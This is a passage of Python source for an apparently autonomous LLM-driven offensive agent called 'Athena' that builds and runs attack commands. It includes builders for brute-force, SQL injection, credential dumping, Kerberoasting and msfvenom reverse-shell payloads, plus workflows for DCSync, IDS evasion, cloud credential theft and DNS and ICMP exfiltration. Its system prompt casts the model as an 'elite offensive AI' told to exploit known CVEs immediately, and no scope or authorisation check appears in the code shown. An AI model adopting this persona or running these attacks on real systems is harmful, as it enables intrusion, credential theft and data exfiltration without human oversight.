        result = f"{head}\n[...{len(result)-1400} chars trimmed...]\n{tail}"
    return result or "(no useful output)"


# ─── Visual helpers ───────────────────────────────────────────────────

def hr(width: int = 64, char: str = "─", color: str = "90") -> str:
    return f"\033[{color}m{char * width}\033[0m"


def header_box(text: str, color: str = "35", width: int = 64) -> str:
    inner = f" {text} ".center(width - 2)
    return (
        f"\033[{color}m┌{'─'*(width-2)}┐\n"
        f"│{inner}│\n"
        f"└{'─'*(width-2)}┘\033[0m"
    )


def status_line(model: str, agent: str, node: str,
                findings: int, verified: int) -> str:
    return (
        f"\033[90m[\033[97mmodel\033[90m] \033[36m{model}  "
        f"\033[90m[\033[97magent\033[90m] \033[33m{agent}  "
        f"\033[90m[\033[97mnode\033[90m] \033[97m{node}  "
        f"\033[90m[\033[97mfindings\033[90m] "
        f"\033[32m{verified}\033[90m/\033[97m{findings}\033[0m"
    )


def finding_card(f: Finding) -> str:
    """One-line card for a finding in the 'findings' command."""
    icon_map = {
        "ip":           "🌐",
        "port":         "🔌",
        "user":         "👤",
        "hash":         "🔐",
        "hash_ntlm":    "🔐",
        "krb_hash":     "🎫",
        "ntlmv2":       "🔐",
        "cred":         "🔑",
        "cve":          "💥",
        "svc":          "⚙",
        "domain":       "🏷",
        "url":          "🔗",
        "exposed_path": "⚠",
        "smb_share":    "📂",
        "email":        "📧",
        "ssh_key":      "🗝",
        "aws_key":      "☁",
    }
    icon = icon_map.get(f.ftype, "•")
    verified_mark = "\033[32m✓\033[0m" if f.verified else "\033[90m?\033[0m"
    val_short = f.value[:60] + ("..." if len(f.value) > 60 else "")
    return (
        f"  {verified_mark} {icon}  \033[97m{f.ftype:<14}\033[0m "
        f"\033[36m{val_short}\033[0m "
        f"\033[90m[node {f.node_id}]\033[0m"
    )


def fancy_header(text: str, color: str = "35") -> str:
    width = max(len(text) + 4, 40)
    line = "─" * width
    padded = text.center(width - 2)
    return (
        f"\033[{color}m┌{line}┐\n"
        f"│ {padded} │\n"
        f"└{line}┘\033[0m"
    )


# ═════════════════════════════════════════════════════════════════════
# TOOL WRAPPER LAYER  (ToolBuilder)
#
# Typed builders that produce shell strings.  The LLM picks the tool +
# arguments, we build the command.  This kills the v6.1 problem of the
# AI typing `nano`, `msfconsole` (interactive), `ssh user@host`, etc.,
# because the wrappers inherently produce non-interactive forms.
#
# All wrappers return a ready-to-execute shell string.
# ═════════════════════════════════════════════════════════════════════

class ToolBuilder:

    @staticmethod
    def nmap(target: str, ports: Optional[str] = None,
             scripts: Optional[str] = None, version: bool = False,
             os_detect: bool = False, fast: bool = False,
             stealth: bool = False, top_ports: Optional[int] = None,
             udp: bool = False, min_rate: Optional[int] = None,
             output_file: Optional[str] = None) -> str:
        parts = ["nmap"]
        if stealth:
            parts.extend(["-T1", "--scan-delay", "5s"])
        elif fast:
            parts.extend(["-T4"])
        if min_rate:
            parts.extend(["--min-rate", str(min_rate)])
        if udp:
            parts.append("-sU")
        else:
            parts.append("-sV" if version else "-sS")
        if os_detect:
            parts.append("-O")
        if scripts:
            parts.append(f"--script={scripts}")
        if top_ports:
            parts.extend(["--top-ports", str(top_ports)])
        elif ports:
            parts.extend(["-p", ports])
        if output_file:
            parts.extend(["-oN", output_file])
        parts.append(target)
        return " ".join(parts)

    @staticmethod
    def rustscan(target: str, ports: str = "1-65535",
                 batch_size: int = 4500) -> str:
        return f"rustscan -a {target} -r {ports} -b {batch_size} -- -sV"

    @staticmethod
    def masscan(target: str, ports: str = "1-65535",
                rate: int = 1000) -> str:
        return f"sudo masscan {target} -p{ports} --rate={rate}"

    @staticmethod
    def gobuster_dir(url: str,
                     wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                     extensions: str = "php,html,txt,bak,zip",
                     threads: int = 30,
                     status_codes: str = "200,204,301,302,307,401,403") -> str:
        return (f"gobuster dir -u {url} -w {wordlist} "
                f"-x {extensions} -t {threads} -s '{status_codes}' --no-error")

    @staticmethod
    def feroxbuster(url: str,
                    wordlist: str = "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
                    extensions: str = "php,html,txt,bak,zip,old,bak.zip",
                    depth: int = 2, threads: int = 50,
                    filter_status: Optional[str] = None) -> str:
        cmd = (f"feroxbuster -u {url} -w {wordlist} -x {extensions} "
               f"-d {depth} -t {threads} --silent --no-state")
        if filter_status:
            cmd += f" --filter-status {filter_status}"
        return cmd

    @staticmethod
    def gobuster_vhost(url: str,
                       wordlist: str = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
                       ) -> str:
        return f"gobuster vhost -u {url} -w {wordlist} --no-error"

    @staticmethod
    def ffuf(url: str, wordlist: str, location: str = "path",
            filter_codes: str = "404") -> str:
        if location == "path":
            return (f"ffuf -u {url}/FUZZ -w {wordlist} "
                    f"-fc {filter_codes} -t 40")
        elif location == "subdomain":
            return (f"ffuf -u {url} -H 'Host: FUZZ.{url}' "
                    f"-w {wordlist} -fc {filter_codes}")
        elif location == "param":
            return (f"ffuf -u {url}?FUZZ=test -w {wordlist} -fc {filter_codes}")
        return f"ffuf -u {url} -w {wordlist} -fc {filter_codes}"

    @staticmethod
    def whatweb(url: str, aggression: int = 3) -> str:
        return f"whatweb -a {aggression} --no-errors {url}"

    @staticmethod
    def nikto(target: str) -> str:
        return f"nikto -h {target} -ask no -nointeractive"

    @staticmethod
    def nuclei(target: str, severity: str = "medium,high,critical",
               templates: Optional[str] = None) -> str:
        cmd = f"nuclei -u {target} -severity {severity} -silent"
        if templates:
            cmd += f" -t {templates}"
        return cmd

    @staticmethod
    def hydra(target: str, service: str, userlist: str,
              passlist: str, port: Optional[int] = None,
              tasks: int = 4, stop_on_success: bool = True) -> str:
        cmd = f"hydra -L {userlist} -P {passlist} -t {tasks}"
        if stop_on_success:
            cmd += " -F"
        cmd += " -e nsr"  # try null, same as user, reverse user
        if port:
            cmd += f" -s {port}"
        cmd += f" {target} {service}"
        return cmd

    @staticmethod
    def sqlmap(url: str, batch: bool = True, level: int = 3,
               risk: int = 2, dbs: bool = True,
               random_agent: bool = True,
               cookie: Optional[str] = None) -> str:
        cmd = f"sqlmap -u '{url}' --level={level} --risk={risk}"
        if batch:
            cmd += " --batch"
        if random_agent:
            cmd += " --random-agent"
        if dbs:
            cmd += " --dbs"
        if cookie:
            cmd += f" --cookie='{cookie}'"
        return cmd

    @staticmethod
    def searchsploit(query: str, json_out: bool = False) -> str:
        cmd = f"searchsploit '{query}'"
        if json_out:
            cmd += " -j"
        return cmd

    @staticmethod
    def smbclient_list(target: str, anonymous: bool = True) -> str:
        if anonymous:
            return f"smbclient -L //{target}/ -N"
        return f"smbclient -L //{target}/"

    @staticmethod
    def crackmapexec(protocol: str, target: str,
                     user: Optional[str] = None,
                     password: Optional[str] = None,
                     hashes: Optional[str] = None,
                     userlist: Optional[str] = None,
                     passlist: Optional[str] = None,
                     module: Optional[str] = None,
                     extra: str = "") -> str:
        # Prefer netexec (nxc) if installed, fall back to crackmapexec
        binary = "nxc" if cmd_exists("nxc") else "crackmapexec"
        cmd = f"{binary} {protocol} {target}"
        if userlist and passlist:
            cmd += f" -u {userlist} -p {passlist}"
        elif user and password:
            cmd += f" -u {user} -p '{password}'"
        elif user and hashes:
            cmd += f" -u {user} -H {hashes}"
        if module:
            cmd += f" -M {module}"
        if extra:
            cmd += f" {extra}"
        return cmd

    @staticmethod
    def enum4linux(target: str) -> str:
        binary = "enum4linux-ng" if cmd_exists("enum4linux-ng") else "enum4linux"
        return f"{binary} -A {target}"

    @staticmethod
    def hashcat(hash_file: str, mode: int,
                wordlist: str = "/usr/share/wordlists/rockyou.txt",
                rules: Optional[str] = None,
                show_first: bool = True) -> str:
        if show_first:
            # cached hits returned instantly
            return f"hashcat -m {mode} {hash_file} {wordlist} --show"
        cmd = f"hashcat -m {mode} {hash_file} {wordlist}"
        if rules:
            cmd += f" -r {rules}"
        return cmd

    @staticmethod
    def hashid(hash_or_file: str) -> str:
        if os.path.exists(hash_or_file):
            return f"hashid {hash_or_file}"
        return f"echo '{hash_or_file}' | hashid"

    @staticmethod
    def curl_basic(url: str, head_only: bool = False,
                   user_agent: str = "Mozilla/5.0",
                   user: Optional[str] = None,
                   password: Optional[str] = None,
                   path_as_is: bool = False,
                   silent: bool = True) -> str:
        cmd = "curl"
        if silent:
            cmd += " -s"
        if head_only:
            cmd += " -I"
        cmd += f" -A '{user_agent}'"
        if user and password is not None:
            cmd += f" -u '{user}:{password}'"
        if path_as_is:
            cmd += " --path-as-is"
        cmd += f" '{url}'"
        return cmd

    @staticmethod
    def kerbrute_userenum(domain: str, dc_ip: str,
                          userlist: str = "/usr/share/seclists/Usernames/jsmith.txt"
                          ) -> str:
        return f"kerbrute userenum --dc {dc_ip} -d {domain} {userlist}"

    @staticmethod
    def impacket_asreproast(domain: str, dc_ip: str,
                            userlist: str) -> str:
        return (f"impacket-GetNPUsers '{domain}/' "
                f"-usersfile {userlist} -no-pass -dc-ip {dc_ip}")

    @staticmethod
    def impacket_kerberoast(domain: str, user: str, password: str,
                            dc_ip: str) -> str:
        return (f"impacket-GetUserSPNs '{domain}/{user}:{password}' "
                f"-dc-ip {dc_ip} -request")

    @staticmethod
    def impacket_secretsdump(domain: str, user: str,
                             password: str, dc_ip: str) -> str:
        return f"impacket-secretsdump '{domain}/{user}:{password}@{dc_ip}'"

    @staticmethod
    def msfvenom_payload(payload: str, lhost: str, lport: int = 4444,
                         fmt: str = "exe", out: str = "/tmp/shell.exe",
                         encoder: Optional[str] = None,
                         iterations: int = 0) -> str:
        cmd = (f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} "
               f"-f {fmt} -o {out}")
        if encoder:
            cmd += f" -e {encoder}"
        if iterations:
            cmd += f" -i {iterations}"
        return cmd

    @staticmethod
    def sslscan(target: str) -> str:
        return f"sslscan {target}"

    @staticmethod
    def testssl(target: str, severity: str = "MEDIUM") -> str:
        return f"testssl.sh --severity {severity} {target}"

    @staticmethod
    def dnsrecon(domain: str, dns_type: str = "std") -> str:
        return f"dnsrecon -d {domain} -t {dns_type}"

    @staticmethod
    def theharvester(domain: str, sources: str = "google,bing,crtsh,duckduckgo",
                     limit: int = 500) -> str:
        return f"theHarvester -d {domain} -b {sources} -l {limit}"


# ═════════════════════════════════════════════════════════════════════
# WORKFLOWS — PTT seeders
#
# Each workflow now constructs an initial PTT for a given engagement
# type, instead of just being a fixed prompt.  Athena's loop then
# walks the tree, dispatching the right specialist per phase.
# ═════════════════════════════════════════════════════════════════════

WORKFLOWS = {

    "1": {
        "name": "Network Recon",
        "description": "ARP sweep → port scan → service detection → CVE correlation",
        "seed": [
            ("Host discovery (arp-scan / ping sweep)", "recon"),
            ("Top-port scan with version detection",   "recon"),
            ("Full TCP scan (-p-) for stragglers",     "recon"),
            ("OS fingerprint (-O / -A)",                "recon"),
            ("CVE correlation via searchsploit",        "recon"),
            ("Per-service deep enum (SMB/SSH/HTTP/etc)","network"),
        ],
    },

    "2": {
        "name": "Web Enumeration",
        "description": "Tech fingerprint → vuln scan → dir/vhost brute",
        "seed": [
            ("Tech fingerprint (whatweb -a 3 + headers)", "web"),
            ("Vulnerability scan (nikto + nuclei)",       "web"),
            ("Directory brute-force (feroxbuster)",       "web"),
            ("Sensitive files (robots.txt /.git /.env)",  "web"),
            ("Vhost enumeration",                          "web"),
            ("CVE correlation per technology",             "web"),
        ],
    },

    "3": {
        "name": "Linux Post-Exploitation",
        "description": "Identity → sudo → SUID → cron → caps → cred hunt",
        "seed": [
            ("Identity & system info (id/whoami/uname)",  "linux_privesc"),
            ("Sudo rights (sudo -l)",                      "linux_privesc"),
            ("SUID hunt (find -perm -4000)",               "linux_privesc"),
            ("Cron jobs (writable scripts?)",              "linux_privesc"),
            ("Capabilities (getcap -r /)",                 "linux_privesc"),
            ("Internal services (ss -tulnp)",              "linux_privesc"),
            ("Cred hunt (history/ssh keys/.env)",          "linux_privesc"),
            ("Kernel CVE check (linux-exploit-suggester)", "linux_privesc"),
        ],
    },

    "4": {
        "name": "Metasploit Exploit",
        "description": "Verify module → resource script → non-interactive run",
        "seed": [
            ("Verify exploit module exists",  "network"),
            ("Build .rc resource script",      "network"),
            ("Execute msfconsole -q -r",       "network"),
        ],
    },

    "5": {
        "name": "SQL Injection Assessment",
        "description": "Manual probe → sqlmap → dump → cred reuse",
        "seed": [
            ("Manual SQLi probe (' single quote test)", "web"),
            ("sqlmap auto-detect + --dbs",                "web"),
            ("Dump interesting tables",                    "web"),
            ("Extract credentials",                        "web"),
            ("Test extracted creds elsewhere",             "credential"),
        ],
    },

    "6": {
        "name": "Hash Cracking",
        "description": "Identify → cached check → wordlist → rules → mask",
        "seed": [
            ("Identify hash type (hashid)",     "credential"),
            ("Check hashcat --show cache",       "credential"),
            ("rockyou + best64 rules",           "credential"),
            ("Mask attack ?u?l?l?l?l?d?d?d",     "credential"),
        ],
    },

    "7": {
        "name": "Password Spraying",
        "description": "Service enum → policy check → spray → reuse",
        "seed": [
            ("Map auth services (SSH/SMB/RDP/web)", "recon"),
            ("Check password policy",                "ad"),
            ("Spray with lockout-aware timing",      "credential"),
            ("Cred reuse across all services",       "credential"),
        ],
    },

    "8": {
        "name": "Active Directory Recon & Attack",
        "description": "Anon enum → AS-REP → spray → Kerberoast → DCSync",
        "seed": [
            ("Anonymous SMB/LDAP enum",           "ad"),
            ("User list extraction (rpcclient/ldap)", "ad"),
            ("AS-REP roasting (no creds)",         "ad"),
            ("Crack AS-REP hashes",                "credential"),
            ("Authenticated enum (BloodHound)",    "ad"),
            ("Kerberoasting",                       "ad"),
            ("Crack TGS hashes",                   "credential"),
            ("ACL abuse / DCSync if possible",     "ad"),
        ],
    },

    "9": {
        "name": "Payload Generation & Listener",
        "description": "msfvenom payloads → handler resource script",
        "seed": [
            ("Get LHOST",                           "exfil"),
            ("Generate Windows x64 reverse_tcp",    "exfil"),
            ("Generate Linux x64 reverse_tcp",      "exfil"),
            ("Generate PHP/JSP/ASPX as needed",     "exfil"),
            ("Build multi/handler .rc + launch",    "network"),
        ],
    },

    "10": {
        "name": "Bluetooth Recon",
        "description": "Interface check → classic + LE scan → service browse",
        "seed": [
            ("hciconfig -a interface check",  "recon"),
            ("hcitool scan (classic)",        "recon"),
            ("hcitool lescan (BLE)",          "recon"),
            ("sdptool browse per device",     "recon"),
        ],
    },

    "11": {
        "name": "OSINT Profiling",
        "description": "whois → DNS → certs → harvester → subdomains",
        "seed": [
            ("whois + DNS records",              "recon"),
            ("Certificate transparency (crt.sh)", "recon"),
            ("theHarvester multi-source",         "recon"),
            ("Subdomain enum (subfinder/amass)",  "recon"),
            ("Probe live subdomains (httpx)",     "web"),
            ("Public github/breach data",         "recon"),
        ],
    },

    "12": {
        "name": "SSL/TLS Audit",
        "description": "sslscan → testssl → cipher review",
        "seed": [
            ("sslscan quick cipher list",  "web"),
            ("testssl.sh full audit",       "web"),
            ("Review weak ciphers/protocols","web"),
            ("Check Heartbleed/POODLE/etc", "web"),
        ],
    },

    "13": {
        "name": "DNS Enumeration",
        "description": "dnsrecon → zone transfer → fierce → resolver checks",
        "seed": [
            ("dnsrecon standard records",   "recon"),
            ("Zone transfer attempt",        "recon"),
            ("fierce subdomain brute",       "recon"),
            ("Open resolver check",          "recon"),
        ],
    },

    "14": {
        "name": "SMB Attack Chain",
        "description": "ms17-010 check → enum → share → relay → SAM",
        "seed": [
            ("ms17-010 / cve-2020-0796 check", "network"),
            ("Anonymous share list",            "network"),
            ("nxc smb --shares",                "network"),
            ("enum4linux full",                 "ad"),
            ("Signing check (relay candidate)", "ad"),
            ("If creds: SAM dump",              "ad"),
        ],
    },

    "15": {
        "name": "API Security Testing",
        "description": "Discovery → params → auth bypass → IDOR → JWT",
        "seed": [
            ("Endpoint discovery (ffuf)",        "web"),
            ("Hidden parameters (arjun)",        "web"),
            ("Auth bypass (no-token requests)",  "web"),
            ("IDOR (numeric ID manipulation)",   "web"),
            ("JWT decode + alg:none + brute",    "web"),
            ("SSRF via URL params",              "web"),
        ],
    },

    "16": {
        "name": "Linux Privilege Escalation",
        "description": "linpeas → GTFOBins → kernel → docker/lxd",
        "seed": [
            ("Quick wins (id/sudo -l/SUID)",  "linux_privesc"),
            ("linpeas full sweep",            "linux_privesc"),
            ("kernel exploit-suggester",      "linux_privesc"),
            ("docker/lxd group check",        "linux_privesc"),
            ("Capabilities deep dive",        "linux_privesc"),
        ],
    },

    "17": {
        "name": "Windows Privilege Escalation",
        "description": "winpeas → tokens → service ACL → AlwaysInstallElevated",
        "seed": [
            ("whoami /priv & /groups",          "windows_privesc"),
            ("systeminfo + wesng",              "windows_privesc"),
            ("Unquoted service paths",          "windows_privesc"),
            ("AlwaysInstallElevated check",     "windows_privesc"),
            ("Stored creds (cmdkey/reg)",       "windows_privesc"),
            ("PrintSpoofer/GodPotato if SeImp", "windows_privesc"),
        ],
    },

    "18": {
        "name": "Lateral Movement",
        "description": "PTH → wmiexec → DCSync → pivot tunnels",
        "seed": [
            ("Cred/hash inventory",       "credential"),
            ("nxc smb host sweep",         "ad"),
            ("psexec / wmiexec / smbexec","ad"),
            ("Kerberos ticket usage",     "ad"),
            ("DCSync if DA",              "ad"),
            ("Pivot tunnels (chisel/ligolo)","exfil"),
        ],
    },

    "19": {
        "name": "Container & Cloud Escape",
        "description": "Container detect → docker socket → metadata → IAM",
        "seed": [
            ("Detect container (cgroup/.dockerenv)", "linux_privesc"),
            ("docker.sock check",                     "linux_privesc"),
            ("Container escape via socket",          "linux_privesc"),
            ("AWS IMDS metadata",                     "exfil"),
            ("IAM credential extraction",             "exfil"),
            ("kubectl auth can-i --list",             "exfil"),
        ],
    },

    "20": {
        "name": "IDS/IPS Evasion",
        "description": "MAC spoof → fragment → decoy → timing → source-port",
        "seed": [
            ("MAC spoof (macchanger)",   "evasion"),
            ("Slow scan -T1 --scan-delay","evasion"),
            ("Fragment -f --mtu 8",       "evasion"),
            ("Decoys -D RND:15",          "evasion"),
            ("Source-port 53 mimic DNS",  "evasion"),
        ],
    },

    "21": {
        "name": "Data Exfiltration",
        "description": "Channel test → HTTPS → DNS → ICMP fallbacks",
        "seed": [
            ("Outbound test (HTTPS to ifconfig.me)", "exfil"),
            ("HTTPS POST exfil",                      "exfil"),
            ("DNS exfil (base64-fold-nslookup)",      "exfil"),
            ("ICMP exfil (ping -p)",                  "exfil"),
        ],
    },

    "22": {
        "name": "Forensics & Evidence",
        "description": "Hash → strings → binwalk → volatility",
        "seed": [
            ("Integrity hash (sha256sum)",    "recon"),
            ("file + strings inspection",      "recon"),
            ("binwalk for embedded data",      "recon"),
            ("volatility memory analysis",     "recon"),
        ],
    },

    "23": {
        "name": "Steganography",
        "description": "Metadata → strings → steghide → zsteg → binwalk",
        "seed": [
            ("file confirms type",         "recon"),
            ("exiftool metadata",           "recon"),
            ("strings + grep flag/key",     "recon"),
            ("steghide -p '' (no pass)",    "recon"),
            ("zsteg -a (PNG/BMP)",          "recon"),
            ("binwalk -e extraction",       "recon"),
        ],
    },
}


# ═════════════════════════════════════════════════════════════════════
# CORE RULES embedded in every system prompt
# ═════════════════════════════════════════════════════════════════════

CORE_RULES = (
    "OUTPUT FORMAT (STRICT — no deviations):\n"
    "  [THOUGHT]<reasoning>[/THOUGHT]\n"
    "  [CMD]<one shell command, non-interactive>[/CMD]\n"
    "  [CONF]<green|yellow|red>[/CONF]\n"
    "  Optional: [VERIFY]<command to verify a finding>[/VERIFY]\n"
    "  Optional: [HANDOFF]<other agent role>[/HANDOFF]\n"
    "RULES:\n"
    " - Never repeat a command verbatim.\n"
    " - Never run apt upgrade or interactive shells (msfconsole/ssh/nano/vim/mysql).\n"
    " - msfconsole MUST use -q -r /tmp/x.rc (last line of rc = exit).\n"
    " - Never invent MSF modules — use only those in S11 KB.\n"
    " - Always pivot from existing findings before scanning fresh.\n"
    " - When CVE is known, exploit it immediately, don't keep enumerating.\n"
    " - WORKFLOW_COMPLETE in [CMD] when current node is done.\n"
    " - CONF green = high confidence direct attack.\n"
    " - CONF yellow = uncertain, propose pivot.\n"
    " - CONF red = need more info before any command.\n"
    " - Cite CVSS/CVE numbers in [THOUGHT] where relevant.\n"
    " - Reason from real subprocess output only — not from prior assumptions."
)


def build_system_prompt(agent_role: str,
                        target_info: Dict[str, Any],
                        ptt: PTT,
                        active_node: Optional[PTTNode],
                        lhost: str,
                        workflow_key: Optional[str] = None,
                        free_form: str = "") -> str:
    """Compose system prompt for the chosen specialist agent.

    Includes: agent persona + extra rules + KB sections + PTT state +
    findings summary + Kali tool registry summary + core rules.
    """
    spec = AGENT_SPECS.get(agent_role, AGENT_SPECS["recon"])

    # Target block
    target_parts = []
    if target_info.get("ip"):
        target_parts.append(f"Target: {target_info['ip']}")
    if target_info.get("domain"):
        target_parts.append(f"Domain: {target_info['domain']}")
    if target_info.get("notes"):
        target_parts.append(f"Mission: {target_info['notes']}")
    target_block = " | ".join(target_parts) if target_parts else "No target set"

    # Active node context
    node_block = ""
    if active_node:
        node_block = (
            f"CURRENT NODE: [{active_node.nid}] {active_node.title} "
            f"(phase={active_node.phase}, status={active_node.status}, "
            f"attempts={active_node.attempts})"
        )
        if active_node.last_cmd:
            node_block += f"\n  last_cmd: {active_node.last_cmd}"

    # Findings summary (verified + unverified separately)
    verified = ptt.get_verified()
    unverified = ptt.get_unverified()

    findings_block = ""
    if verified or unverified:
        findings_block = "FINDINGS:\n"
        # Group verified
        if verified:
            v_dict: Dict[str, List[str]] = {}
            for f in verified:
                v_dict.setdefault(f.ftype, []).append(f.value)
            findings_block += "  VERIFIED:\n"
            for k, vs in v_dict.items():
                findings_block += f"    {k}: {', '.join(vs[-6:])}\n"
        if unverified:
            u_dict: Dict[str, List[str]] = {}
            for f in unverified:
                u_dict.setdefault(f.ftype, []).append(f.value)
            findings_block += "  UNVERIFIED (treat as candidates only):\n"
            for k, vs in u_dict.items():
                findings_block += f"    {k}: {', '.join(vs[-6:])}\n"

    # PTT serialised
    ptt_block = ptt.to_natural_language(max_chars=1500)

    # Skip directives derived from findings
    skip = []
    fdict = ptt.findings_by_type_dict()
    if fdict.get("port"):
        skip.append("ports already known — skip discovery")
    if fdict.get("ip") and len(fdict["ip"]) > 1:
        skip.append("hosts already known — skip ping sweep")
    if fdict.get("svc"):
        skip.append("services fingerprinted — skip banner grab")
    if fdict.get("user"):
        skip.append("USE known users for spray")
    if fdict.get("cred"):
        skip.append("TEST creds across all services NOW")
    if fdict.get("hash") or fdict.get("hash_ntlm") or fdict.get("krb_hash"):
        skip.append("QUEUE hashes for cracking")
    if fdict.get("cve"):
        skip.append("EXPLOIT known CVEs first")
    skip_block = ""
    if skip:
        skip_block = "PIVOT DIRECTIVES: " + " | ".join(skip)

    # Knowledge base — agent-aware
    kb_text = get_kb_sections(workflow_key=workflow_key,
                              prompt_text=free_form,
                              agent_role=agent_role)

    # Kali tools available
    tools_block = kali_tool_summary_for_prompt()

    parts = [
        f"You are Athena, an elite offensive AI assistant on Kali NetHunter.",
        f"Operator: The Priest.  Your LHOST: {lhost}",
        "",
        f"=== ACTIVE AGENT: {spec['icon']} {spec['name']} ===",
        spec["persona"],
        spec["extra_rules"],
        "",
        target_block,
    ]
    if node_block:
        parts.append(node_block)
    if findings_block:
        parts.append(findings_block.strip())
    if skip_block:
        parts.append(skip_block)
    parts.append(ptt_block)
    parts.append(tools_block)
    parts.append("KNOWLEDGE BASE:\n" + kb_text)
    parts.append(CORE_RULES)
    return "\n\n".join(parts)


# ═════════════════════════════════════════════════════════════════════
# RESPONSE PARSING
# ═════════════════════════════════════════════════════════════════════

def parse_specialist_response(text: str) -> Dict[str, Any]:
    """Extract THOUGHT / CMD / CONF / VERIFY / HANDOFF from model output."""
    out = {
        "thought":  "",
        "cmd":      None,
        "conf":     "green",
        "verify":   None,
        "handoff":  None,
    }
    if not text:
        return out

    t = re.search(r'\[THOUGHT\](.*?)\[/?THOUGHT\]', text, re.DOTALL | re.IGNORECASE)
    if t:
        out["thought"] = t.group(1).strip()

    c = re.search(r'\[CMD\](.*?)\[/?CMD\]', text, re.DOTALL | re.IGNORECASE)
    if c:
        out["cmd"] = c.group(1).strip()

    cf = re.search(r'\[CONF\]\s*(green|yellow|red)\s*\[/?CONF\]',
                   text, re.IGNORECASE)
    if cf:
        out["conf"] = cf.group(1).lower()

    v = re.search(r'\[VERIFY\](.*?)\[/?VERIFY\]', text, re.DOTALL | re.IGNORECASE)
    if v:
        out["verify"] = v.group(1).strip()

    h = re.search(r'\[HANDOFF\]\s*(\w+)\s*\[/?HANDOFF\]', text, re.IGNORECASE)
    if h:
        out["handoff"] = h.group(1).strip().lower()

    return out


# ═════════════════════════════════════════════════════════════════════
# ATHENA SESSION
# ═════════════════════════════════════════════════════════════════════

class AthenaSession:

    def __init__(self):
        self.target_info: Dict[str, Any] = {}
        self.lhost = "127.0.0.1"
        self.logfile = None
        self.session_start = datetime.datetime.now()
        self.history: List[Dict[str, str]] = []
        self.command_history: List[str] = []
        self.stuck_counter = 0
        self.tools_available: Dict[str, bool] = {}
        self.current_workflow_key: Optional[str] = None
        self.current_agent: str = "recon"

        # PTT replaces the flat findings dict.
        self.ptt = PTT(goal="Mission undefined")

        # Provider state
        self.provider_index = 0
        self.groq_client: Optional[Groq] = None

        os.makedirs(INSTALL_DIR, exist_ok=True)
        os.makedirs(LOG_DIR, exist_ok=True)

        self._init_provider()
        self._start_log()
        self._run_boot_check()
        self.lhost = get_lhost()
        ensure_rockyou()

    # ── Provider init ─────────────────────────────────────────────

    def _init_provider(self):
        groq_key = os.environ.get("GROQ_API_KEY")
        if not groq_key:
            print(
                "\n\033[31m   FATAL: GROQ_API_KEY not set.\033[0m\n"
                "   Add to ~/.bashrc:  export GROQ_API_KEY='your_key'\n"
                "   Then: source ~/.bashrc\n"
            )
            sys.exit(1)
        try:
            self.groq_client = Groq(api_key=groq_key)
        except Exception as e:
            print(f"\033[31m   FATAL: Groq init: {e}\033[0m")
            sys.exit(1)
        first = PROVIDER_CHAIN[0]
        print(f"\033[32m   ✅ Groq client OK\033[0m")
        print(f"\033[32m   Active model: {first[1]}\033[0m")

    # ── Logging ───────────────────────────────────────────────────

    def _start_log(self):
        ts = self.session_start.strftime("%Y%m%d_%H%M%S")
        log_path = os.path.join(LOG_DIR, f"session_{ts}.txt")
        try:
            self.logfile = open(log_path, "w")
            self.logfile.write(
                f"ATHENA v{VERSION} LOG\n"
                f"Started: {self.session_start.isoformat()}\n"
                f"{'='*64}\n\n"
            )
            self.logfile.flush()
            print(f"\033[90m   Log: {log_path}\033[0m")
        except Exception as e:
            print(f"\033[33m   Log open failed: {e}\033[0m")

    def _log(self, text: str):
        if self.logfile:
            try:
                clean = re.sub(r'\033\[[0-9;]*m', '', text)
                self.logfile.write(clean + "\n")
                self.logfile.flush()
            except Exception:
                pass

    def _run_boot_check(self):
        if os.path.exists(BOOT_LOCK):
            return
        print("\n\033[35m   ATHENA:\033[0m Boot check...")
        result = subprocess.run(
            "apt list --upgradable 2>/dev/null",
            shell=True, capture_output=True, text=True
        )
        upgrades = result.stdout.lower()
        threats = [p for p in BANNED_UPGRADE_PACKAGES if p in upgrades]
        if threats:
            print(f"\033[33m   UI THREAT BLOCKED: {', '.join(threats)}\033[0m")
        else:
            print("\033[32m   System OK\033[0m")
        try:
            with open(BOOT_LOCK, "w") as f:
                f.write("ok")
        except Exception:
            pass

    # ── Provider call & fallback chain ────────────────────────────

    def _call_provider(self, messages: list, model: str,
                       max_tokens: int = MAX_TOKENS_DEFAULT) -> str:
        completion = self.groq_client.chat.completions.create(
            model=model,
            messages=messages,
            temperature=0.2,
            max_tokens=max_tokens,
        )
        return completion.choices[0].message.content

    def _think_with_fallback(self, messages: list,
                             max_tokens: int = MAX_TOKENS_DEFAULT) -> Optional[str]:
        start_index = self.provider_index
        last_error = None

        for attempt in range(len(PROVIDER_CHAIN)):
            idx = (start_index + attempt) % len(PROVIDER_CHAIN)
            model_id, model_name = PROVIDER_CHAIN[idx]

            try:
                response = self._call_provider(messages, model_id, max_tokens)
                if idx != self.provider_index:
                    self.provider_index = idx
                    print(f"\n\033[33m   ↪ Switched to: {model_name}\033[0m")
                return response

            except Exception as e:
                last_error = e
                err = str(e).lower()
                is_limit = any(x in err for x in [
                    "rate", "limit", "429", "quota",
                    "too many", "queue", "capacity"
                ])
                is_404 = "404" in err or "not_found" in err or "does not exist" in err
                is_cf = "cloudflare" in err

                if is_404:
                    print(f"\033[33m   {model_name} unavailable — skipping\033[0m")
                    continue
                elif is_limit:
                    print(f"\n\033[33m   {model_name} rate-limited — falling to next\033[0m")
                    continue
                elif is_cf:
                    print(f"\n\033[33m   {model_name} blocked by CF — next\033[0m")
                    continue
                else:
                    short = err[:100]
                    print(f"\n\033[31m   {model_name} error: {short}\033[0m")
                    continue

        print(f"\n\033[31m   ⚠  All providers exhausted: {last_error}\033[0m")
        return None

    def _current_model_name(self) -> str:
        if 0 <= self.provider_index < len(PROVIDER_CHAIN):
            return PROVIDER_CHAIN[self.provider_index][1]
        return "Unknown"

    # ── Target setup ──────────────────────────────────────────────

    def set_target(self):
        print("\n\033[35m   ATHENA:\033[0m Set target. Enter to skip any field.\n")
        try:
            ip     = input("   IP / CIDR range : ").strip()
            domain = input("   Domain / URL    : ").strip()
            notes  = input("   Mission notes   : ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return

        self.target_info = {
            "ip":     ip or None,
            "domain": domain or None,
            "notes":  notes or None,
        }
        # Refresh the PTT root with the actual goal
        goal = "Compromise " + (ip or domain or "target")
        if notes:
            goal += f" — {notes}"
        self.ptt = PTT(goal=goal)

        if ip or domain:
            summary = " | ".join(filter(None, [ip, domain]))
            print(f"\n\033[32m   Target: {summary}\033[0m")
